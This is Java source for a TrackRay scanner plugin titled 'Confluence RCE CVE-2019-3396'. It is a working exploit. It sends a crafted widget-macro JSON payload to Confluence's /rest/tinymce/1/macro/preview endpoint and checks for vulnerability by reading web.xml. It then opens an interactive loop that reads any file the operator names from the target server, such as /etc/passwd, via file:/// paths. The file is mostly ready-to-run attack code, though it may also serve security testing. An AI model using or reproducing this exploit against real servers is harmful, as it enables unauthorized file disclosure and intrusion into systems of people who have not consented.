package com.trackray.module.plugin.webapp.confluence;

import com.trackray.base.annotation.Param;
import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Rule;
import com.trackray.base.plugin.WebSocketPlugin;
import com.trackray.base.utils.Message;
import org.javaweb.core.net.HttpResponse;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;
import org.springframework.web.util.HtmlUtils;

import java.net.MalformedURLException;
import java.util.Map;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2019/4/10 12:55
 */
@Plugin(value = "confluenceRCE",
        title = "Confluence RCE CVE-2019-3396",
        author = "浅蓝")
@Rule(websocket = true,params = {@Param(key = "url" ,desc = "目标地址")})
public class ConfluenceServerRCE extends WebSocketPlugin {
    public static String readFilePayload = "{\"contentId\":\"786458\",\"macro\":{\"name\":\"widget\",\"body\":\"\",\"params\":{\"url\":\"https://www.viddler.com/v/23464dc6\",\"width\":\"1000\",\"height\":\"1000\",\"_template\":\"%s\"}}}";

    @Override
    public boolean check(Map param) {
        if (!param.isEmpty()){
            this.url = param.get(this.currentParams()[0].key()).toString();
            if (url.endsWith("/"))
                url = url.substring(0,url.length()-1);
            Document parse = attack(String.format(readFilePayload, "../web.xml"));
            if (parse!=null){
                Elements wiki = parse.getElementsByClass("wiki-content");
                if (wiki!=null&&wiki.hasText()){
                    String text = wiki.html();
                    if (text.contains("filter-class"))
                        sendColorMsg(Message.RED("存在安全漏洞"));
                        return true;
                }
            }
        }
        return false;
    }
    private String url ;
    @Override
    public Object start() {

        println("请输入要读取的文件 如/etc/passwd，输入exit退出");

        while(true){
            String input = getInput();
            if (input.equals("exit"))
                break;

            if (input.startsWith("/"))
                input = input.substring(1,input.length());
            String format = String.format(readFilePayload, "file:///".concat(input));
            Document parse = attack(format);

            if (parse!=null){
                Elements wiki = parse.getElementsByClass("wiki-content");
                if (wiki!=null&&wiki.hasText()){
                    String text = wiki.html();
                    println("=========================");
                    sendColorMsg(Message.RED(HtmlUtils.htmlEscape(text)));
                    println("=========================");
                }
            }

        }

        return "";
    }

    private Document attack(String data){
        try {
            HttpResponse post = requests.url(url.concat("/rest/tinymce/1/macro/preview"))
                    .contentType("application/json; charset=utf-8")
                    .timeout(60000)
                    .referer(url + "/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&")
                    .data(data).post();

            String body = post.body();
            if (body!=null)
                return Jsoup.parse(body);

        } catch (MalformedURLException e) {

        }
        return null;
    }
}
